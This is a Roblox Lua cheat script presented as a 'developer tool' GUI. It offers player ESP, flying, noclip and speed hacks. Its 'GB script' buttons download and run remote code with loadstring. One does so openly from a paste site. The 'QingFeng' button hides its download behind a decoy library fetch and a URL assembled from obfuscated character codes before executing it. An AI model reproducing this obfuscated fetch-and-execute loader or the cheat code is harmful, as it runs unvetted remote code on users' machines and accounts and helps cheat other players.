local Players = game:GetService("Players")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- 删除已存在的工具GUI（真的会有人去开我这个垃圾脚本源码吗）
local existingTool = playerGui:FindFirstChild("DevToolGUI")
if existingTool then
    existingTool:Destroy()
end

-- 创建主ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "DevToolGUI"
screenGui.Parent = playerGui

-- 创建主容器
local mainContainer = Instance.new("Frame")
mainContainer.Name = "MainContainer"
mainContainer.Size = UDim2.new(1, 0, 1, 0)
mainContainer.Position = UDim2.new(0, 0, 0, 0)
mainContainer.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
mainContainer.Parent = screenGui

-- 创建左侧导航栏
local sidebar = Instance.new("Frame")
sidebar.Name = "Sidebar"
sidebar.Size = UDim2.new(0, 220, 1, 0)
sidebar.Position = UDim2.new(0, 0, 0, 0)
sidebar.BackgroundColor3 = Color3.fromRGB(37, 37, 38)
sidebar.BorderSizePixel = 0
sidebar.Parent = mainContainer

-- 创建Logo区域
local logoFrame = Instance.new("Frame")
logoFrame.Name = "LogoFrame"
logoFrame.Size = UDim2.new(1, 0, 0, 50)
logoFrame.Position = UDim2.new(0, 0, 0, 0)
logoFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 48)
logoFrame.BorderSizePixel = 0
logoFrame.Parent = sidebar

local logoIcon = Instance.new("TextLabel")
logoIcon.Name = "LogoIcon"
logoIcon.Size = UDim2.new(0, 32, 0, 32)
logoIcon.Position = UDim2.new(0, 15, 0, 9)
logoIcon.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
logoIcon.Text = "R"
logoIcon.TextColor3 = Color3.fromRGB(255, 255, 255)
logoIcon.TextScaled = true
logoIcon.BorderSizePixel = 0
logoIcon.Parent = logoFrame

local logoText = Instance.new("TextLabel")
logoText.Name = "LogoText"
logoText.Size = UDim2.new(0, 120, 0, 32)
logoText.Position = UDim2.new(0, 57, 0, 9)
logoText.BackgroundTransparency = 1
logoText.Text = "开发工具"
logoText.TextColor3 = Color3.fromRGB(212, 212, 212)
logoText.TextSize = 16
logoText.TextXAlignment = Enum.TextXAlignment.Left
logoText.Font = Enum.Font.SourceSansSemibold
logoText.Parent = logoFrame

-- 创建导航区域
local navContainer = Instance.new("ScrollingFrame")
navContainer.Name = "NavContainer"
navContainer.Size = UDim2.new(1, 0, 1, -50)
navContainer.Position = UDim2.new(0, 0, 0, 50)
navContainer.BackgroundColor3 = Color3.fromRGB(37, 37, 38)
navContainer.BorderSizePixel = 0
navContainer.ScrollBarThickness = 6
navContainer.ScrollBarImageColor3 = Color3.fromRGB(86, 86, 86)
navContainer.CanvasSize = UDim2.new(0, 0, 0, 800)
navContainer.Parent = sidebar

-- 创建功能区
local function createNavSection(title, sectionName, buttons)
    local sectionFrame = Instance.new("Frame")
    sectionFrame.Name = sectionName .. "Section"
    sectionFrame.Size = UDim2.new(1, 0, 0, 40 + (#buttons * 40))
    sectionFrame.BackgroundTransparency = 1
    sectionFrame.Parent = navContainer
    
    local sectionTitle = Instance.new("TextLabel")
    sectionTitle.Name = "SectionTitle"
    sectionTitle.Size = UDim2.new(1, -20, 0, 30)
    sectionTitle.Position = UDim2.new(0, 10, 0, 0)
    sectionTitle.BackgroundTransparency = 1
    sectionTitle.Text = title
    sectionTitle.TextColor3 = Color3.fromRGB(150, 150, 150)
    sectionTitle.TextSize = 12
    sectionTitle.TextXAlignment = Enum.TextXAlignment.Left
    sectionTitle.Font = Enum.Font.SourceSansSemibold
    sectionTitle.Parent = sectionFrame
    
    local buttonContainer = Instance.new("Frame")
    buttonContainer.Name = "ButtonContainer"
    buttonContainer.Size = UDim2.new(1, 0, 0, #buttons * 40)
    buttonContainer.Position = UDim2.new(0, 0, 0, 30)
    buttonContainer.BackgroundTransparency = 1
    buttonContainer.Parent = sectionFrame
    
    for i, buttonInfo in ipairs(buttons) do
        local navButton = Instance.new("TextButton")
        navButton.Name = buttonInfo.name
        navButton.Size = UDim2.new(1, 0, 0, 35)
        navButton.Position = UDim2.new(0, 0, 0, (i-1)*40)
        navButton.BackgroundColor3 = Color3.fromRGB(37, 37, 38)
        navButton.BorderSizePixel = 0
        navButton.Text = "  " .. buttonInfo.text
        navButton.TextColor3 = Color3.fromRGB(212, 212, 212)
        navButton.TextSize = 14
        navButton.TextXAlignment = Enum.TextXAlignment.Left
        navButton.Font = Enum.Font.SourceSans
        navButton.Parent = buttonContainer
        
        -- 按钮悬停效果
        navButton.MouseEnter:Connect(function()
            if not buttonInfo.selected then
                navButton.BackgroundColor3 = Color3.fromRGB(62, 62, 66)
            end
        end)
        
        navButton.MouseLeave:Connect(function()
            if not buttonInfo.selected then
                navButton.BackgroundColor3 = Color3.fromRGB(37, 37, 38)
            end
        end)
        
        buttonInfo.button = navButton
    end
    
    return sectionFrame, buttons
end

-- 定义功能区按钮
local functionButtons = {
    {name = "PlayerESP", text = "透视玩家", selected = false},
    {name = "Fly", text = "飞行", selected = false},
    {name = "Noclip", text = "穿墙", selected = false},
    {name = "Speed", text = "修改速度", selected = true}
}

-- 定义信息区按钮
local infoButtons = {
    {name = "GameStats", text = "游戏统计", selected = false},
    {name = "Performance", text = "性能监控", selected = false},
    {name = "DebugInfo", text = "调试信息", selected = false}
}

-- 定义设置区按钮
local settingsButtons = {
    {name = "General", text = "通用设置", selected = false},
    {name = "Graphics", text = "图形设置", selected = false},
    {name = "Controls", text = "控制设置", selected = false}
}

-- 定义GB脚本区按钮
local gbScriptButtons = {
    {name = "ClearWater", text = "清水脚本", selected = false},
    {name = "QingFeng", text = "清风脚本", selected = false}
}

-- 创建各个导航区
local functionSection, functionButtons = createNavSection("功能区", "Function", functionButtons)
functionSection.Position = UDim2.new(0, 0, 0, 0)

local infoSection, infoButtons = createNavSection("信息区", "Info", infoButtons)
infoSection.Position = UDim2.new(0, 0, 0, functionSection.Size.Y.Offset)

local settingsSection, settingsButtons = createNavSection("设置区", "Settings", settingsButtons)
settingsSection.Position = UDim2.new(0, 0, 0, functionSection.Size.Y.Offset + infoSection.Size.Y.Offset)

local gbScriptSection, gbScriptButtons = createNavSection("GB脚本", "GBScript", gbScriptButtons)
gbScriptSection.Position = UDim2.new(0, 0, 0, functionSection.Size.Y.Offset + infoSection.Size.Y.Offset + settingsSection.Size.Y.Offset)

-- 创建内容区域
local contentArea = Instance.new("Frame")
contentArea.Name = "ContentArea"
contentArea.Size = UDim2.new(1, -220, 1, 0)
contentArea.Position = UDim2.new(0, 220, 0, 0)
contentArea.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
contentArea.BorderSizePixel = 0
contentArea.Parent = mainContainer

-- 创建内容标题栏
local contentHeader = Instance.new("Frame")
contentHeader.Name = "ContentHeader"
contentHeader.Size = UDim2.new(1, 0, 0, 40)
contentHeader.Position = UDim2.new(0, 0, 0, 0)
contentHeader.BackgroundColor3 = Color3.fromRGB(45, 45, 48)
contentHeader.BorderSizePixel = 0
contentHeader.Parent = contentArea

local contentTitle = Instance.new("TextLabel")
contentTitle.Name = "ContentTitle"
contentTitle.Size = UDim2.new(0.7, 0, 1, 0)
contentTitle.Position = UDim2.new(0, 20, 0, 0)
contentTitle.BackgroundTransparency = 1
contentTitle.Text = "修改速度"
contentTitle.TextColor3 = Color3.fromRGB(212, 212, 212)
contentTitle.TextSize = 18
contentTitle.TextXAlignment = Enum.TextXAlignment.Left
contentTitle.Font = Enum.Font.SourceSansSemibold
contentTitle.Parent = contentHeader

-- 创建窗口控制按钮容器
local windowControls = Instance.new("Frame")
windowControls.Name = "WindowControls"
windowControls.Size = UDim2.new(0, 80, 1, 0)
windowControls.Position = UDim2.new(1, -80, 0, 0)
windowControls.BackgroundTransparency = 1
windowControls.Parent = contentHeader

-- 创建缩放按钮
local minimizeButton = Instance.new("TextButton")
minimizeButton.Name = "MinimizeButton"
minimizeButton.Size = UDim2.new(0, 30, 0, 30)
minimizeButton.Position = UDim2.new(0, 10, 0.5, -15)
minimizeButton.BackgroundColor3 = Color3.fromRGB(62, 62, 66)
minimizeButton.BorderSizePixel = 0
minimizeButton.Text = "_"
minimizeButton.TextColor3 = Color3.fromRGB(212, 212, 212)
minimizeButton.TextSize = 16
minimizeButton.Parent = windowControls

-- 创建关闭按钮
local closeButton = Instance.new("TextButton")
closeButton.Name = "CloseButton"
closeButton.Size = UDim2.new(0, 30, 0, 30)
closeButton.Position = UDim2.new(0, 50, 0.5, -15)
closeButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
closeButton.BorderSizePixel = 0
closeButton.Text = "×"
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.TextSize = 18
closeButton.Parent = windowControls

-- 创建内容滚动区域
local contentScroll = Instance.new("ScrollingFrame")
contentScroll.Name = "ContentScroll"
contentScroll.Size = UDim2.new(1, 0, 1, -40)
contentScroll.Position = UDim2.new(0, 0, 0, 40)
contentScroll.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
contentScroll.BorderSizePixel = 0
contentScroll.ScrollBarThickness = 8
contentScroll.ScrollBarImageColor3 = Color3.fromRGB(86, 86, 86)
contentScroll.CanvasSize = UDim2.new(0, 0, 0, 800)
contentScroll.Parent = contentArea

-- 创建功能项模板
local function createFunctionItem(name, text, hasToggle, hasValue, defaultValue, hasSlider)
    local itemFrame = Instance.new("Frame")
    itemFrame.Name = name
    itemFrame.Size = UDim2.new(1, -40, 0, 60)
    itemFrame.Position = UDim2.new(0, 20, 0, 0)
    itemFrame.BackgroundColor3 = Color3.fromRGB(37, 37, 38)
    itemFrame.BorderSizePixel = 0
    
    local itemLabel = Instance.new("TextLabel")
    itemLabel.Name = "ItemLabel"
    itemLabel.Size = UDim2.new(0.6, 0, 0, 30)
    itemLabel.Position = UDim2.new(0, 15, 0, 15)
    itemLabel.BackgroundTransparency = 1
    itemLabel.Text = text
    itemLabel.TextColor3 = Color3.fromRGB(212, 212, 212)
    itemLabel.TextSize = 14
    itemLabel.TextXAlignment = Enum.TextXAlignment.Left
    itemLabel.Font = Enum.Font.SourceSans
    itemLabel.Parent = itemFrame
    
    local controlsFrame = Instance.new("Frame")
    controlsFrame.Name = "Controls"
    controlsFrame.Size = UDim2.new(0.35, 0, 1, 0)
    controlsFrame.Position = UDim2.new(0.65, 0, 0, 0)
    controlsFrame.BackgroundTransparency = 1
    controlsFrame.Parent = itemFrame
    
    local toggleButton, valueButton, slider
    
    if hasToggle then
        toggleButton = Instance.new("TextButton")
        toggleButton.Name = "Toggle"
        toggleButton.Size = UDim2.new(0, 80, 0, 30)
        toggleButton.Position = UDim2.new(0, 0, 0.5, -15)
        toggleButton.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
        toggleButton.BorderSizePixel = 0
        toggleButton.Text = "开启"
        toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        toggleButton.TextSize = 12
        toggleButton.Parent = controlsFrame
        
        -- 切换功能
        toggleButton.MouseButton1Click:Connect(function()
            if toggleButton.Text == "开启" then
                toggleButton.Text = "关闭"
                toggleButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
            else
                toggleButton.Text = "开启"
                toggleButton.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
            end
        end)
    end
    
    if hasValue then
        valueButton = Instance.new("TextButton")
        valueButton.Name = "Value"
        valueButton.Size = UDim2.new(0, 80, 0, 30)
        valueButton.Position = UDim2.new(0, 90, 0.5, -15)
        valueButton.BackgroundColor3 = Color3.fromRGB(62, 62, 66)
        valueButton.BorderSizePixel = 0
        valueButton.Text = tostring(defaultValue or "0")
        valueButton.TextColor3 = Color3.fromRGB(212, 212, 212)
        valueButton.TextSize = 12
        valueButton.Parent = controlsFrame
        
        -- 数值编辑功能
        valueButton.MouseButton1Click:Connect(function()
            local value = tonumber(valueButton.Text)
            if value then
                value = value + 1
                if value > 10 then value = 0 end
                valueButton.Text = tostring(value)
            end
        end)
    end
    
    if hasSlider then
        -- 创建滑块容器
        local sliderContainer = Instance.new("Frame")
        sliderContainer.Name = "SliderContainer"
        sliderContainer.Size = UDim2.new(1, -100, 0, 30)
        sliderContainer.Position = UDim2.new(0, 0, 0.5, -15)
        sliderContainer.BackgroundTransparency = 1
        sliderContainer.Parent = controlsFrame
        
        -- 创建滑块背景
        local sliderBackground = Instance.new("Frame")
        sliderBackground.Name = "SliderBackground"
        sliderBackground.Size = UDim2.new(0.6, 0, 0, 6)
        sliderBackground.Position = UDim2.new(0, 0, 0.5, -3)
        sliderBackground.BackgroundColor3 = Color3.fromRGB(62, 62, 66)
        sliderBackground.BorderSizePixel = 0
        sliderBackground.Parent = sliderContainer
        
        -- 创建滑块
        slider = Instance.new("TextButton")
        slider.Name = "Slider"
        slider.Size = UDim2.new(0, 20, 0, 20)
        slider.Position = UDim2.new(0, 0, 0.5, -10)
        slider.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
        slider.BorderSizePixel = 0
        slider.Text = ""
        slider.Parent = sliderContainer
        
        -- 创建数值显示
        local valueDisplay = Instance.new("TextLabel")
        valueDisplay.Name = "ValueDisplay"
        valueDisplay.Size = UDim2.new(0, 40, 0, 30)
        valueDisplay.Position = UDim2.new(0.65, 10, 0, 0)
        valueDisplay.BackgroundTransparency = 1
        valueDisplay.Text = tostring(defaultValue or "0")
        valueDisplay.TextColor3 = Color3.fromRGB(212, 212, 212)
        valueDisplay.TextSize = 12
        valueDisplay.Parent = sliderContainer
        
        -- 滑块拖动功能
        local dragging = false
        local function updateSlider(position)
            local relativeX = math.clamp(position.X, 0, sliderBackground.AbsoluteSize.X)
            local percentage = relativeX / sliderBackground.AbsoluteSize.X
            local value = math.floor(percentage * 100)
            
            slider.Position = UDim2.new(percentage, -10, 0.5, -10)
            valueDisplay.Text = tostring(value)
        end
        
        slider.MouseButton1Down:Connect(function()
            dragging = true
        end)
        
        game:GetService("UserInputService").InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                dragging = false
            end
        end)
        
        game:GetService("UserInputService").InputChanged:Connect(function(input)
            if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
                updateSlider(input.Position)
            end
        end)
    end
    
    return itemFrame, toggleButton, valueButton, slider
end

-- 创建透视玩家功能
local function createPlayerESPContent()
    contentScroll:ClearAllChildren()
    
    local espToggle = createFunctionItem("PlayerESP", "玩家透视", true, false)
    espToggle.Position = UDim2.new(0, 20, 0, 20)
    espToggle.Parent = contentScroll
    
    -- 透视功能实现
    local espEnabled = false
    local nameTags = {}
    
    espToggle:FindFirstChild("Controls"):FindFirstChild("Toggle").MouseButton1Click:Connect(function()
        espEnabled = not espEnabled
        
        if espEnabled then
            -- 启用透视
            for _, player in pairs(Players:GetPlayers()) do
                if player ~= Players.LocalPlayer and player.Character then
                    local head = player.Character:FindFirstChild("Head")
                    if head then
                        local nameTag = Instance.new("BillboardGui")
                        nameTag.Name = "ESPTag"
                        nameTag.Adornee = head
                        nameTag.Size = UDim2.new(0, 100, 0, 40)
                        nameTag.StudsOffset = Vector3.new(0, 3, 0)
                        nameTag.AlwaysOnTop = true
                        nameTag.Parent = head
                        
                        local nameLabel = Instance.new("TextLabel")
                        nameLabel.Size = UDim2.new(1, 0, 0.5, 0)
                        nameLabel.Position = UDim2.new(0, 0, 0, 0)
                        nameLabel.BackgroundTransparency = 1
                        nameLabel.Text = player.Name
                        nameLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
                        nameLabel.TextSize = 14
                        nameLabel.Parent = nameTag
                        
                        local healthLabel = Instance.new("TextLabel")
                        healthLabel.Size = UDim2.new(1, 0, 0.5, 0)
                        healthLabel.Position = UDim2.new(0, 0, 0.5, 0)
                        healthLabel.BackgroundTransparency = 1
                        healthLabel.Text = "HP: " .. tostring(player.Character:FindFirstChild("Humanoid").Health)
                        healthLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
                        healthLabel.TextSize = 12
                        healthLabel.Parent = nameTag
                        
                        nameTags[player] = nameTag
                    end
                end
            end
        else
            -- 禁用透视
            for player, nameTag in pairs(nameTags) do
                nameTag:Destroy()
            end
            nameTags = {}
        end
    end)
end

-- 创建飞行功能
local function createFlyContent()
    contentScroll:ClearAllChildren()
    
    local flyToggle = createFunctionItem("Fly", "飞行模式", true, false)
    flyToggle.Position = UDim2.new(0, 20, 0, 20)
    flyToggle.Parent = contentScroll
    
    -- 飞行功能实现
    local flyEnabled = false
    local bodyGyro, bodyVelocity
    
    flyToggle:FindFirstChild("Controls"):FindFirstChild("Toggle").MouseButton1Click:Connect(function()
        flyEnabled = not flyEnabled
        local character = Players.LocalPlayer.Character
        if not character then return end
        
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if not humanoid then return end
        
        if flyEnabled then
            -- 启用飞行
            humanoid.PlatformStand = true
            
            bodyGyro = Instance.new("BodyGyro")
            bodyGyro.P = 1000
            bodyGyro.D = 50
            bodyGyro.MaxTorque = Vector3.new(4000, 4000, 4000)
            bodyGyro.CFrame = character.HumanoidRootPart.CFrame
            bodyGyro.Parent = character.HumanoidRootPart
            
            bodyVelocity = Instance.new("BodyVelocity")
            bodyVelocity.Velocity = Vector3.new(0, 0, 0)
            bodyVelocity.MaxForce = Vector3.new(4000, 4000, 4000)
            bodyVelocity.Parent = character.HumanoidRootPart
            
            -- 飞行控制
            local connection
            connection = game:GetService("RunService").Heartbeat:Connect(function()
                if not flyEnabled then
                    connection:Disconnect()
                    return
                end
                
                local root = character.HumanoidRootPart
                local camera = workspace.CurrentCamera
                
                bodyGyro.CFrame = camera.CFrame
                
                local direction = Vector3.new()
                if game:GetService("UserInputService"):IsKeyDown(Enum.Key.W) then
                    direction = direction + camera.CFrame.LookVector
                end
                if game:GetService("UserInputService"):IsKeyDown(Enum.Key.S) then
                    direction = direction - camera.CFrame.LookVector
                end
                if game:GetService("UserInputService"):IsKeyDown(Enum.Key.A) then
                    direction = direction - camera.CFrame.RightVector
                end
                if game:GetService("UserInputService"):IsKeyDown(Enum.Key.D) then
                    direction = direction + camera.CFrame.RightVector
                end
                if game:GetService("UserInputService"):IsKeyDown(Enum.Key.Space) then
                    direction = direction + Vector3.new(0, 1, 0)
                end
                if game:GetService("UserInputService"):IsKeyDown(Enum.Key.LeftShift) then
                    direction = direction - Vector3.new(0, 1, 0)
                end
                
                bodyVelocity.Velocity = direction * 50
            end)
        else
            -- 禁用飞行
            humanoid.PlatformStand = false
            if bodyGyro then bodyGyro:Destroy() end
            if bodyVelocity then bodyVelocity:Destroy() end
        end
    end)
end

-- 创建穿墙功能
local function createNoclipContent()
    contentScroll:ClearAllChildren()
    
    local noclipToggle = createFunctionItem("Noclip", "穿墙模式", true, false)
    noclipToggle.Position = UDim2.new(0, 20, 0, 20)
    noclipToggle.Parent = contentScroll
    
    -- 穿墙功能实现
    local noclipEnabled = false
    local connection
    
    noclipToggle:FindFirstChild("Controls"):FindFirstChild("Toggle").MouseButton1Click:Connect(function()
        noclipEnabled = not noclipEnabled
        local character = Players.LocalPlayer.Character
        if not character then return end
        
        if noclipEnabled then
            -- 启用穿墙
            for _, part in pairs(character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
            
            connection = game:GetService("RunService").Stepped:Connect(function()
                if not noclipEnabled then
                    connection:Disconnect()
                    return
                end
                
                for _, part in pairs(character:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
            end)
        else
            -- 禁用穿墙
            if connection then
                connection:Disconnect()
            end
            
            for _, part in pairs(character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = true
                end
            end
        end
    end)
end

-- 创建修改速度功能
local function createSpeedContent()
    contentScroll:ClearAllChildren()
    
    local speedItem, _, _, speedSlider = createFunctionItem("Speed", "移动速度", false, false, 16, true)
    speedItem.Position = UDim2.new(0, 20, 0, 20)
    speedItem.Parent = contentScroll
    
    -- 速度修改功能
    local speedValue = 16
    
    -- 数值输入按钮
    local inputButton = Instance.new("TextButton")
    inputButton.Name = "InputButton"
    inputButton.Size = UDim2.new(0, 80, 0, 30)
    inputButton.Position = UDim2.new(0.8, 10, 0.5, -15)
    inputButton.BackgroundColor3 = Color3.fromRGB(62, 62, 66)
    inputButton.BorderSizePixel = 0
    inputButton.Text = "输入数值"
    inputButton.TextColor3 = Color3.fromRGB(212, 212, 212)
    inputButton.TextSize = 12
    inputButton.Parent = speedItem:FindFirstChild("Controls")
    
    inputButton.MouseButton1Click:Connect(function()
        -- 这里可以添加输入框来让用户输入具体数值
        speedValue = 50  -- 示例值
        local humanoid = Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.WalkSpeed = speedValue
        end
    end)
    
    -- 应用速度修改
    local function applySpeed(value)
        local humanoid = Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.WalkSpeed = value
        end
    end
    
    -- 滑块值变化时应用速度
    if speedSlider then
        -- 监听滑块值变化
        game:GetService("RunService").Heartbeat:Connect(function()
            local displayText = speedItem:FindFirstChild("Controls"):FindFirstChild("SliderContainer"):FindFirstChild("ValueDisplay").Text
            local newValue = tonumber(displayText)
            if newValue and newValue ~= speedValue then
                speedValue = newValue
                applySpeed(speedValue)
            end
        end)
    end
end

-- 创建GB脚本区内容
local function createGBScriptContent()
    contentScroll:ClearAllChildren()
    
    -- 清水脚本按钮
    local clearWaterButton = Instance.new("TextButton")
    clearWaterButton.Name = "ClearWaterButton"
    clearWaterButton.Size = UDim2.new(1, -40, 0, 50)
    clearWaterButton.Position = UDim2.new(0, 20, 0, 20)
    clearWaterButton.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
    clearWaterButton.BorderSizePixel = 0
    clearWaterButton.Text = "执行清水脚本"
    clearWaterButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    clearWaterButton.TextSize = 14
    clearWaterButton.Parent = contentScroll
    
    clearWaterButton.MouseButton1Click:Connect(function()
        -- 执行清水脚本
        loadstring(game:HttpGet("https://pastefy.app/A3Nqz4Np/raw"))()
    end)
    
    -- 清风脚本按钮
    local qingFengButton = Instance.new("TextButton")
    qingFengButton.Name = "QingFengButton"
    qingFengButton.Size = UDim2.new(1, -40, 0, 50)
    qingFengButton.Position = UDim2.new(0, 20, 0, 90)
    qingFengButton.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
    qingFengButton.BorderSizePixel = 0
    qingFengButton.Text = "执行清风脚本"
    qingFengButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    qingFengButton.TextSize = 14
    qingFengButton.Parent = contentScroll
    
    qingFengButton.MouseButton1Click:Connect(function()
        -- 执行清风脚本
        local generated_url = "https://raw.githubusercontent.com/Egor-Skriptunoff/pure_lua_SHA/refs/heads/master/sha2.lua" 
        local response = game:HttpGet(generated_url)
        if response then    
            (function(v5) 
                local l = function(...) 
                    local _ = "" 
                    for i,p in next,{...} do 
                        _ = _..string.char(p) 
                    end 
                    return _ 
                end 
                local x = getfenv(2) 
                return function(v6,...) 
                    v6 = l(v6,...) 
                    return function(v1,...) 
                        v1 = l(v1,...) 
                        return function(v3,...) 
                            v3 = l(v3,...) 
                            return function(v2,...) 
                                v2 = l(v2,...) 
                                return function(v7,...) 
                                    v7 = l(v7,...) 
                                    v10 = (v3..v7..v6..v5..v2..v1) 
                                    return function(v9,...) 
                                        v9 = l(v9,...) 
                                        v10 = (v3..v2..v7..v6..v5..v1..v9) 
                                        return function(v8,...) 
                                            v8 = l(v8,...) 
                                            v10 = (v9..v5..v8..v3..v7..v6..v2) 
                                            return function(v0,...) 
                                                v0 = l(v0,...) 
                                                v10 = (v1..v7..v0..v9..v5..v8..v6..v3..v2) 
                                                return function(v4,...) 
                                                    v4 = l(v4,...) 
                                                    v10 = (v6..v4..v1..v5..v0..v8..v7..v2..v3..v9) 
                                                    return function(v10,...) 
                                                        v10 = l(v10,...) 
                                                        v10 = (v4..v6..v3..v1..v9..v8..v0..v2..v7..v10) 
                                                        return function(e) 
                                                            return x[l(unpack(e[1]))](game[l(unpack(e[2]))](game,v10)) 
                                                        end 
                                                    end 
                                                end 
                                            end 
                                        end 
                                    end 
                                end 
                            end 
                        end 
                    end 
                end 
            end)(string.char(92))
            (119,46,103,105,116,104,117,98,117,115,101)
            (47,115,107,117,114,103,102,51,48,76,70,69)
            (114,99,111,110,116,101,110,116,46,99,111,109)
            (102,47,114,101,102,115,47)
            (104,101,97,100,115,47,109,97)
            (52,48,99,98,48,70,115,112)
            (49,56,56,54,97,78,50,65,116)
            (47,116,102,54,53,56,101,90,97,83,74,49,78,71)
            (104,116,116,112,115,58,47,47,114,97)
            (105,110,47,109,70,57,71,118,51,70,120,106,81,116,79,56)
            ({{108,111,97,100,115,116,114,105,110,103},{72,116,116,112,71,101,116}})()
            ("qing")
        end
    end)
end

-- 初始显示速度修改内容
createSpeedContent()

-- 导航按钮点击处理
local function handleNavButtonClick(button, buttonInfo, allButtons)
    -- 重置所有按钮状态
    for _, btn in ipairs(allButtons) do
        if btn.button then
            btn.button.BackgroundColor3 = Color3.fromRGB(37, 37, 38)
            btn.selected = false
        end
    end
    
    -- 设置当前按钮为选中状态
    button.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
    buttonInfo.selected = true
    
    -- 更新内容标题
    contentTitle.Text = button.Text:gsub("^%s+", "")
    
    -- 根据选择的按钮更新内容
    if buttonInfo.name == "PlayerESP" then
        createPlayerESPContent()
    elseif buttonInfo.name == "Fly" then
        createFlyContent()
    elseif buttonInfo.name == "Noclip" then
        createNoclipContent()
    elseif buttonInfo.name == "Speed" then
        createSpeedContent()
    elseif buttonInfo.name == "ClearWater" or buttonInfo.name == "QingFeng" then
        createGBScriptContent()
    else
        -- 清空内容区域并显示提示
        contentScroll:ClearAllChildren()
        local message = Instance.new("TextLabel")
        message.Size = UDim2.new(1, 0, 0, 100)
        message.Position = UDim2.new(0, 0, 0.4, 0)
        message.BackgroundTransparency = 1
        message.Text = button.Text:gsub("^%s+", "") .. " 功能\n(功能开发中)"
        message.TextColor3 = Color3.fromRGB(150, 150, 150)
        message.TextSize = 18
        message.TextWrapped = true
        message.Parent = contentScroll
    end
end

-- 为所有导航按钮绑定点击事件
for _, button in ipairs(functionButtons) do
    if button.button then
        button.button.MouseButton1Click:Connect(function()
            handleNavButtonClick(button.button, button, functionButtons)
        end)
    end
end

for _, button in ipairs(infoButtons) do
    if button.button then
        button.button.MouseButton1Click:Connect(function()
            handleNavButtonClick(button.button, button, infoButtons)
        end)
    end
end

for _, button in ipairs(settingsButtons) do
    if button.button then
        button.button.MouseButton1Click:Connect(function()
            handleNavButtonClick(button.button, button, settingsButtons)
        end)
    end
end

for _, button in ipairs(gbScriptButtons) do
    if button.button then
        button.button.MouseButton1Click:Connect(function()
            handleNavButtonClick(button.button, button, gbScriptButtons)
        end)
    end
end

-- 设置初始选中状态
functionButtons[4].button.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
functionButtons[4].selected = true

-- 创建最小化状态的小窗口
local minimizedWindow = Instance.new("TextButton")
minimizedWindow.Name = "MinimizedWindow"
minimizedWindow.Size = UDim2.new(0, 80, 0, 80)
minimizedWindow.Position = UDim2.new(0, 20, 0.5, -40)
minimizedWindow.BackgroundColor3 = Color3.fromRGB(45, 45, 48)
minimizedWindow.BorderSizePixel = 0
minimizedWindow.Text = "GUI"
minimizedWindow.TextColor3 = Color3.fromRGB(212, 212, 212)
minimizedWindow.TextSize = 14
minimizedWindow.Visible = false
minimizedWindow.Parent = screenGui

-- 添加圆角效果
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0.2, 0)
corner.Parent = minimizedWindow

-- 窗口状态变量
local isMinimized = false

-- 缩放按钮功能
minimizeButton.MouseButton1Click:Connect(function()
    if not isMinimized then
        -- 最小化窗口
        isMinimized = true
        mainContainer.Visible = false
        minimizedWindow.Visible = true
    else
        -- 恢复窗口
        isMinimized = false
        minimizedWindow.Visible = false
        mainContainer.Visible = true
    end
end)

-- 最小化窗口点击恢复功能
minimizedWindow.MouseButton1Click:Connect(function()
    isMinimized = false
    minimizedWindow.Visible = false
    mainContainer.Visible = true
end)

-- 关闭按钮功能
closeButton.MouseButton1Click:Connect(function()
    screenGui:Destroy()
end)

-- 按钮悬停效果
minimizeButton.MouseEnter:Connect(function()
    minimizeButton.BackgroundColor3 = Color3.fromRGB(86, 86, 86)
end)

minimizeButton.MouseLeave:Connect(function()
    minimizeButton.BackgroundColor3 = Color3.fromRGB(62, 62, 66)
end)

closeButton.MouseEnter:Connect(function()
    closeButton.BackgroundColor3 = Color3.fromRGB(220, 70, 70)
end)

closeButton.MouseLeave:Connect(function()
    closeButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
end)

minimizedWindow.MouseEnter:Connect(function()
    minimizedWindow.BackgroundColor3 = Color3.fromRGB(62, 62, 66)
end)

minimizedWindow.MouseLeave:Connect(function()
    minimizedWindow.BackgroundColor3 = Color3.fromRGB(45, 45, 48)
end)

print("UI已加载!")
print("功能: 透视玩家, 飞行, 穿墙, 修改速度, GB脚本")
